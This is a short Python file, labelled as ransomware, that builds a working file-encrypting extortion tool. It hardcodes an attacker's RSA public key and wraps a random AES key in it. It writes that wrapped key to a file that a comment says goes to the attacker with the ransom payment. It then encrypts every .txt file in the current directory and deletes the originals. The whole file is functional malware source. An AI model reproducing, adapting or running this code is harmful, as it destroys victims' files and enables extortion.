#RansomWare

# Importing necessary libraries
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import os
from Crypto.PublicKey import RSA


#Hardcoded Public Key
keye = b'''-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAlcR+EOiZtFIQ342af9pC
6EsM991TblRaHdf/G02e2aW02VdoX00uoBrKpIfLwpyC/zP/AU9tHI7gfO4eihrh
2/lwDMSjwriyos4vTUTg/rtCWRrDq36RPGn0CljEwMPyzZ38RYDV2FxCDcLAHFH3
/atfFGgC64BbrugLmh58uCTC6GUf3BaS+V1dd9K9Pq76byyCQHLARBJjJkIgue7O
a1ZuTishtVMAVq9aTgNcxpRRVdzxIjo1RKE6ZiVH9ks6O1mjNaXHmr0KI3pWazNO
xya7v6Juc4ohpZ7ICFX6CxdIg2mKdlvwadaqiHOX6I0JYok35yBiJDyaNl8kDA8v
5uwL5DNqKvyggXrc9BdstDYviynGoiMCelhZmkpFwoN6CMblV+QaRsk6ab95yVhz
BaaXYNDqjDOdVU/hILvWIR7shcgcXkRD/J1Z2b3xA5vxhGkSE1e4X3c6g5DWReBj
Hf04Xt4iKPWv9O8WZE066+WJGDgaTL1EB1EJ/GRjmuLTAgMBAAE=
-----END PUBLIC KEY-----'''
public_key = RSA.import_key(keye)

#Generate a random 16 byte key
k = get_random_bytes(16)

#Encrypt k using the public key encryption with key e.key; output the result as file
#EncryptedSharedKey. This file should be submitted with the ransom payment to
#the attacker, allowing the attacker to provide the unlocking file (see below).
#Encrypt the key

cipher = PKCS1_OAEP.new(public_key)
encrypted_key = cipher.encrypt(k)

#Write the encrypted key to a file
with open('EncryptedSharedKey', 'wb') as f:
    f.write(encrypted_key)


for file in os.listdir():
    #check if the file ends in .txt
    if file.endswith('.txt'):
        #open the file
        with open(file, 'rb') as f:
            #read the file
            plaintext = f.read()
            #Encrypt the file
            cipher = AES.new(k, AES.MODE_CBC)
            ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
            #Write the encrypted file
            with open(f'{file}.encrypted', 'wb') as f:
                f.write(cipher.iv + ciphertext)

        #Delete the original file
        os.remove(file)
